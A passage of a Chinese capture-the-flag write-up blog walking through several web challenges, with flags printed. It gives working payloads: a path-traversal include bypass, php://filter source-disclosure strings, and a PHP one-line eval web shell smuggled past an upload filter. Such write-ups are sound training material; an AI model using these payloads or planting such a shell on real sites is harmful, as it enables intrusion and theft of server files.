class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//明显看到代码中在验证后直接包含了我们上传的内容</span>     exit<span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>     <span class="token keyword">echo</span> <span class="token string">"&lt;br>&lt;img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" />"</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>开发人员为了防止意外，做了许多的验证步骤</p><pre class="line-numbers language-php"><code class="language-php"><span class="token variable">$whitelist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"source"</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">"source.php"</span><span class="token punctuation">,</span><span class="token string">"hint"</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">"hint.php"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//建立访问白名单</span>         <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment" spellcheck="true">//规定输入类型为字符串</span>             <span class="token keyword">echo</span> <span class="token string">"you can't see it"</span><span class="token punctuation">;</span>             <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span>         <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment" spellcheck="true">//第一次，直接验证输入是否在白名单中</span>             <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span>         <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">mb_substr</span><span class="token punctuation">(</span>             <span class="token variable">$page</span><span class="token punctuation">,</span>             <span class="token number">0</span><span class="token punctuation">,</span>             <span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token variable">$page</span> <span class="token punctuation">.</span> <span class="token string">'?'</span><span class="token punctuation">,</span> <span class="token string">'?'</span><span class="token punctuation">)</span>         <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//在原输入后加？，并规定遇到？停止截取字符串，并交给$_page,本意是得到所有的字符串</span>         <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>             <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span>            <span class="token comment" spellcheck="true">//再次验证$_page,感觉多此一举，可能是怕传入了get参数导致验证错误（仅为猜测）</span>         <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//防止浏览器url解码导致错误，进行解码确定不会存在编码影响</span>         <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">mb_substr</span><span class="token punctuation">(</span>             <span class="token variable">$_page</span><span class="token punctuation">,</span>             <span class="token number">0</span><span class="token punctuation">,</span>             <span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token variable">$_page</span> <span class="token punctuation">.</span> <span class="token string">'?'</span><span class="token punctuation">,</span> <span class="token string">'?'</span><span class="token punctuation">)</span>         <span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>             <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span>            <span class="token comment" spellcheck="true">//再次验证解码后的字符串</span>         <span class="token keyword">echo</span> <span class="token string">"you can't see it"</span><span class="token punctuation">;</span>         <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span> <span class="token punctuation">}</span><span class="token comment" spellcheck="true">//开发人员（模拟场景）为了防止因为各种原因出bug，细心的做了多种情况的验证，极大增加了用户体验。</span><span class="token comment" spellcheck="true">//对安全人员而言,多重验证增加了绕过的可能</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>绕过点</p><pre class="line-numbers language-php"><code class="language-php">         <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">mb_substr</span><span class="token punctuation">(</span>             <span class="token variable">$page</span><span class="token punctuation">,</span>             <span class="token number">0</span><span class="token punctuation">,</span>             <span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token variable">$page</span> <span class="token punctuation">.</span> <span class="token string">'?'</span><span class="token punctuation">,</span> <span class="token string">'?'</span><span class="token punctuation">)</span>         <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//在原输入后加？，并规定遇到？停止截取字符串，并交给$_page,本意是得到所有的字符串</span><span class="token comment" spellcheck="true">//这里告诉我们可以手动增加？绕过后面的白名单验证</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h3 id="目录穿越漏洞"><a href="#目录穿越漏洞" class="headerlink" title="目录穿越漏洞"></a>目录穿越漏洞</h3><blockquote><p>本题flag不在网站根目录的flag文件，而是在服务器根目录的ffffllllaaaagggg文件</p><p><img src="image-20210426203124540.png" alt="image-20210426203124540"></p><p>所以不能使用/flag读取。</p><p>实现读取，这里使用目录穿越漏洞</p><p>参考链接：</p><p><a href="https://blog.csdn.net/qq_41232519/article/details/107166432">https://blog.csdn.net/qq_41232519/article/details/107166432</a>  </p><p>linux 系统可以使用 cd .. 进入上级目录，在没有配置Nginx的配置文件/etc/nginx/conf.d/error2.conf的/files使用/闭合时，可以使用该原理实现目录穿越</p><pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">include</span> <span class="token string">'/../../../../flag'</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//读取到服务器根目录下的flag</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这告诉我们开发不要偷懒</p></blockquote><h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><blockquote><pre class="line-numbers language-php"><code class="language-php"><span class="token operator">?</span>file<span class="token operator">=</span>source<span class="token punctuation">.</span>php<span class="token operator">?</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span>ffffllllaaaagggg<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></blockquote><h3 id="flag"><a href="#flag" class="headerlink" title="flag:"></a>flag:</h3><blockquote><pre class="line-numbers language-PHP"><code class="language-PHP">flag{7c14b426-3463-4739-8445-03cb56eea4e6}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></blockquote><h2 id="ACTF2020-新生赛-Include"><a href="#ACTF2020-新生赛-Include" class="headerlink" title="[ACTF2020 新生赛]Include"></a>[ACTF2020 新生赛]Include</h2><h3 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h3><blockquote><p>参考地址：</p><p><a href="https://www.freebuf.com/articles/web/182280.html">https://www.freebuf.com/articles/web/182280.html</a></p><p>PHP 带有很多内置 URL 风格的封装协议，可用于类似 fopen()、 copy()、 file_exists() 和 filesize() 的文件系统函数。 除了这些封装协议，还能通过 stream_wrapper_register() 来注册自定义的封装协议。</p><p><img src="1535362079_5b83c41fbe910.png" alt="1535362079_5b83c41fbe910"></p><p>在存在文件包含或者文件读取的情况下，有时会存在php伪协议的使用</p></blockquote><h3 id="payload-1"><a href="#payload-1" class="headerlink" title="payload:"></a>payload:</h3><blockquote><p>题目明确告诉我们flag位于flag.php文件，但访问无意义，猜测在php代码中</p><pre class="line-numbers language-php"><code class="language-php"><span class="token operator">?</span>file<span class="token operator">=</span>php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//filter/convert.base64-encode/resource=flag.php</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>php://filter (本地磁盘读取)</strong></p><p>条件：只是读取，需要开启 allow_url_fopen，不需要开启 allow_url_include；</p></blockquote><h3 id="flag-1"><a href="#flag-1" class="headerlink" title="flag"></a>flag</h3><blockquote><pre class="line-numbers language-php"><code class="language-php">PD9waHAKZWNobyAiQ2FuIHlvdSBmaW5kIG91dCB0aGUgZmxhZz8iOwovL2ZsYWd7ZWU1YmYzNjYtMGUwYi00YTBjLWIxZDktYjBmOTVmNDk0ZGNlfQo<span class="token operator">=</span><span class="token comment" spellcheck="true">//base64解码</span><span class="token delimiter">&lt;?php</span><span class="token keyword">echo</span> <span class="token string">"Can you find out the flag?"</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//flag{ee5bf366-0e0b-4a0c-b1d9-b0f95f494dce}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>题目很简单，只是在告诉我们，include文件包含可以引发伪协议漏洞造成源码泄露</strong></p></blockquote><h2 id="ACTF2020-新生赛-Exec"><a href="#ACTF2020-新生赛-Exec" class="headerlink" title="[ACTF2020 新生赛]Exec"></a>[ACTF2020 新生赛]Exec</h2><h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><blockquote><p>太简单了没说头</p></blockquote><h3 id="payload-2"><a href="#payload-2" class="headerlink" title="payload"></a>payload</h3><h2 id="极客大挑战-2019-Havefun"><a href="#极客大挑战-2019-Havefun" class="headerlink" title="[极客大挑战 2019]Havefun"></a>[极客大挑战 2019]Havefun</h2><blockquote><p>看源代码提示</p><pre class="line-numbers language-php"><code class="language-php">             <span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span>     <span class="token variable">$cat</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'cat'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>     <span class="token keyword">echo</span> <span class="token variable">$cat</span><span class="token punctuation">;</span>     <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$cat</span><span class="token operator">==</span><span class="token string">'dog'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>         <span class="token keyword">echo</span> <span class="token string">'Syc{cat_cat_cat_cat}'</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span>     <span class="token operator">--</span><span class="token operator">></span>         <span class="token comment" spellcheck="true">//get传参cat=dog,出了</span>         <span class="token comment" spellcheck="true">//签到难度都没有</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h4 id="payload-3"><a href="#payload-3" class="headerlink" title="payload:"></a>payload:</h4><blockquote><pre class="line-numbers language-php"><code class="language-php"><span class="token operator">?</span>cat<span class="token operator">=</span>dog<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></blockquote><h4 id="flag-2"><a href="#flag-2" class="headerlink" title="flag:"></a>flag:</h4><blockquote><pre class="line-numbers language-php"><code class="language-php">flag<span class="token punctuation">{</span>4cad5ea1<span class="token operator">-</span>a7c8<span class="token operator">-</span>4eb8<span class="token operator">-</span>9d46<span class="token operator">-</span>b1676cef8e09<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></blockquote><h2 id="极客大挑战-2019-Upload"><a href="#极客大挑战-2019-Upload" class="headerlink" title="[极客大挑战 2019]Upload"></a>[极客大挑战 2019]Upload</h2><h3 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h3><blockquote><p><img src="image-20210518173743972.png" alt="image-20210518173743972"></p><p>进入后搜索框提示上传图片</p><p>先测试，原原本本的传一张正常头像</p><p><img src="image-20210518173906421.png" alt="image-20210518173906421"></p><p>哈皮出题人，正常图像都报错，脑子有坑，于是我进行了漫长的测试，改Type改文件名，笑死，根本传不上去</p><p>没办法，查了别人的wp,发现要<strong>检测filename，Type和文件头（我正常图片你和我讲文件头，脑子有坑，Type还不能是jpeg，绝了）</strong></p><p>改后上传成功</p><p>先上传php文件试试</p><p><img src="image-20210518174614403.png" alt="image-20210518174614403"></p><p>感情类型不对全当不是图片算呗，出题人我给你个buff</p><p>burp抓包，改类型和文件头，发现php后缀被过滤（意料之中）</p><p><img src="image-20210518174830773.png" alt="image-20210518174830773"></p><p>改phtml，报错，&lt;? 被过滤</p><p><img src="image-20210518174913371.png" alt="image-20210518174913371"></p><p>这里我想到了用html语言的srcipt标签</p><p><img src="image-20210518175021964.png" alt="image-20210518175021964"></p><pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">language</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>php<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script language-javascript"><span class="token function">eval</span><span class="token punctuation">(</span>$_POST<span class="token punctuation">[</span><span class="token string">'mujie'</span><span class="token punctuation">]</span><span class="token punctuation">)</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>成功</p><p><img src="image-20210518175108827.png" alt="image-20210518175108827"></p><p>猜测上传位置是upload目录，访问它</p><p><img src="image-20210518175151778.png" alt="image-20210518175151778"></p><p>有显示，说明猜测正确，但post传参phpinfo()没反应，心累了，直接蚁剑</p></blockquote><h3 id="payload-4"><a href="#payload-4" class="headerlink" title="payload"></a>payload</h3><blockquote><pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">language</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>php<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script language-javascript"><span class="token function">eval</span><span class="token punctuation">(</span>$_POST<span class="token punctuation">[</span><span class="token string">'mujie'</span><span class="token punctuation">]</span><span class="token punctuation">)</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></blockquote><h3 id="flag-3"><a href="#flag-3" class="headerlink" title="flag"></a>flag</h3><blockquote><p><img src="image-20210518175638202-1621331799239.png" alt="image-20210518175638202"></p></blockquote><pre class="line-numbers language-flag"><code class="language-flag">flag{97b3f0f2-8f22-4087-8980-0ff831e3970e}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>做完了这道题，我还是不懂，正常图片是没文件头吗？有这么偷懒的？简直瞎搞</strong></p><h2 id="极客大挑战-2019-Secret-File"><a href="#极客大挑战-2019-Secret-File" class="headerlink" title="[极客大挑战 2019]Secret File"></a>[极客大挑战 2019]Secret File</h2><h3 id="同样是php伪协议"><a href="#同样是php伪协议" class="headerlink" title="同样是php伪协议"></a>同样是php伪协议</h3><blockquote><p>看源代码</p><pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>master<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>./Archive_room.php<span class="token punctuation">"</span></span><span class="token style-attr language-css"><span class="token attr-name"> <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">background-color</span><span class="token punctuation">:</span><span class="token hexcode">#000000</span><span class="token punctuation">;</span><span class="token property">height</span><span class="token punctuation">:</span><span class="token number">70</span>px<span class="token punctuation">;</span><span class="token property">width</span><span class="token punctuation">:</span><span class="token number">200</span>px<span class="token punctuation">;</span><span class="token property">color</span><span class="token punctuation">:</span>black<span class="token punctuation">;</span><span class="token property">left</span><span class="token punctuation">:</span><span class="token number">44%</span><span class="token punctuation">;</span><span class="token property">cursor</span><span class="token punctuation">:</span>default<span class="token punctuation">;</span></span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Oh! You found me<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>访问Archive_room.php</p><p><img src="image-20210426214544772.png" alt="image-20210426214544772"></p><p>点击后发现跳转到end.php</p><p>回去看源代码</p><pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>master<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>./action.php<span class="token punctuation">"</span></span><span class="token style-attr language-css"><span class="token attr-name"> <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">background-color</span><span class="token punctuation">:</span>red<span class="token punctuation">;</span><span class="token property">height</span><span class="token punctuation">:</span><span class="token number">50</span>px<span class="token punctuation">;</span><span class="token property">width</span><span class="token punctuation">:</span><span class="token number">200</span>px<span class="token punctuation">;</span><span class="token property">color</span><span class="token punctuation">:</span><span class="token hexcode">#FFFFFF</span><span class="token punctuation">;</span><span class="token property">left</span><span class="token punctuation">:</span><span class="token number">44%</span><span class="token punctuation">;</span></span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>访问action.php会跳转，burp抓包</p><pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token comment" spellcheck="true">&lt;!--secr3t.php        --></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>访问secr3t.php   </p><pre class="line-numbers language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span></span> <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span></span>secret<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span></span> <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?php</span> <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$file</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strstr</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token string">"../"</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span> <span class="token string">"tp"</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token string">"input"</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token string">"data"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>     <span class="token keyword">echo</span> <span class="token string">"Oh no!"</span><span class="token punctuation">;</span>     <span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//flag放在了flag.php里</span><span class="token delimiter">?></span><span class="token operator">&lt;</span><span class="token operator">/</span>html<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h4 id="payload-5"><a href="#payload-5" class="headerlink" title="payload:"></a>payload:</h4><blockquote><pre class="line-numbers language-php"><code class="language-php"><span class="token operator">?</span>file<span class="token operator">=</span>php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//filter/convert.base64-encode/resource=flag.php</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></blockquote><h4 id="flag-4"><a href="#flag-4" class="headerlink" title="flag:"></a>flag:</h4><blockquote><pre class="line-numbers language-html"><code class="language-html">PCFET0NUWVBFIGh0bWw+Cgo8aHRtbD4KCiAgICA8aGVhZD4KICAgICAgICA8bWV0YSBjaGFyc2V0PSJ1dGYtOCI+CiAgICAgICAgPHRpdGxlPkZMQUc8L3RpdGxlPgogICAgPC9oZWFkPgoKICAgIDxib2R5IHN0eWxlPSJiYWNrZ3JvdW5kLWNvbG9yOmJsYWNrOyI+PGJyPjxicj48YnI+PGJyPjxicj48YnI+CiAgICAgICAgCiAgICAgICAgPGgxIHN0eWxlPSJmb250LWZhbWlseTp2ZXJkYW5hO2NvbG9yOnJlZDt0ZXh0LWFsaWduOmNlbnRlcjsiPuWViuWTiO+8geS9oOaJvuWIsOaIkeS6hu+8geWPr+aYr+S9oOeci+S4jeWIsOaIkVFBUX5+fjwvaDE+PGJyPjxicj48YnI+CiAgICAgICAgCiAgICAgICAgPHAgc3R5bGU9ImZvbnQtZmFtaWx5OmFyaWFsO2NvbG9yOnJlZDtmb250LXNpemU6MjBweDt0ZXh0LWFsaWduOmNlbnRlcjsiPgogICAgICAgICAgICA8P3BocAogICAgICAgICAgICAgICAgZWNobyAi5oiR5bCx5Zyo6L+Z6YeMIjsKICAgICAgICAgICAgICAgICRmbGFnID0gJ2ZsYWd7MTNkZGMxOTgtNTNiNS00Mjg0LTg5NTUtZmY4ZTEyN2Q3ZDVifSc7CiAgICAgICAgICAgICAgICAkc2VjcmV0ID0gJ2ppQW5nX0x1eXVhbl93NG50c19hX2cxcklmcmkzbmQnCiAgICAgICAgICAgID8+CiAgICAgICAgPC9wPgogICAgPC9ib2R5PgoKPC9odG1sPgo=//解码<span class="token doctype">&lt;!DOCTYPE html></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>FLAG<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token style-attr language-css"><span class="token attr-name"> <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">background-color</span><span class="token punctuation">:</span>black<span class="token punctuation">;</span></span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token style-attr language-css"><span class="token attr-name"> <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">font-family</span><span class="token punctuation">:</span>verdana<span class="token punctuation">;</span><span class="token property">color</span><span class="token punctuation">:</span>red<span class="token punctuation">;</span><span class="token property">text-align</span><span class="token punctuation">:</span>center<span class="token punctuation">;</span></span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>啊哈！你找到我了！可是你看不到我QAQ~~~<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token style-attr language-css"><span class="token attr-name"> <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">font-family</span><span class="token punctuation">:</span>arial<span class="token punctuation">;</span><span class="token property">color</span><span class="token punctuation">:</span>red<span class="token punctuation">;</span><span class="token property">font-size</span><span class="token punctuation">:</span><span class="token number">20</span>px<span class="token punctuation">;</span><span class="token property">text-align</span><span class="token punctuation">:</span>center<span class="token punctuation">;</span></span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>         <span class="token prolog">&lt;?php             echo "我就在这里";             $flag = 'flag{13ddc198-53b5-4284-8955-ff8e127d7d5b}';             $secret = 'jiAng_Luyuan_w4nts_a_g1rIfri3nd'         ?></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span>//flag{13ddc198-53b5-4284-8955-ff8e127d7d5b}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h2 id="极客大挑战-2019-Knife"><a href="#极客大挑战-2019-Knife" class="headerlink" title="[极客大挑战 2019]Knife"></a>[极客大挑战 2019]Knife</h2><h3 id="蚁剑-菜刀连接一句话木马，白给题"><a href="#蚁剑-菜刀连接一句话木马，白给题" class="headerlink" title="蚁剑/菜刀连接一句话木马，白给题"></a>蚁剑/菜刀连接一句话木马，白给题</h3><blockquote><p><img src="image-20210519200640019.png" alt="image-20210519200640019"></p><p>懂了吧，不懂百度一句话木马</p></blockquote><h3 id="payload-6"><a href="#payload-6" class="headerlink" title="payload"></a>payload</h3><blockquote><p>蚁剑/菜刀自己连</p></blockquote><h3 id="flag-5"><a href="#flag-5" class="headerlink" title="flag"></a>flag</h3><pre class="line-numbers language-flag"><code class="language-flag">flag{85f8bd90-e8c6-43d0-8d9d-1485b8eac6a2}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="极客大挑战-2019-Http"><a href="#极客大挑战-2019-Http" class="headerlink" title="[极客大挑战 2019]Http"></a>[极客大挑战 2019]Http</h2><h3 id="http基础知识及请求伪造"><a href="#http基础知识及请求伪造" class="headerlink" title="http基础知识及请求伪造"></a>http基础知识及请求伪造</h3><blockquote><p>查看源码</p><p><img src="image-20210519204637846.png" alt="image-20210519204637846"></p><p>这有个跳转，直接进去</p><p><img src="image-20210519204711878.png" alt="image-20210519204711878"></p><p>不是这个从网址跳转，伪造referer</p><p><img src="image-20210519204805648.png" alt="image-20210519204805648"></p><p>我这里用的是modheader,这里同样可以使用burp抓包，以及新版的hackbar</p><p>访问</p><p><img src="image-20210519204929008.png" 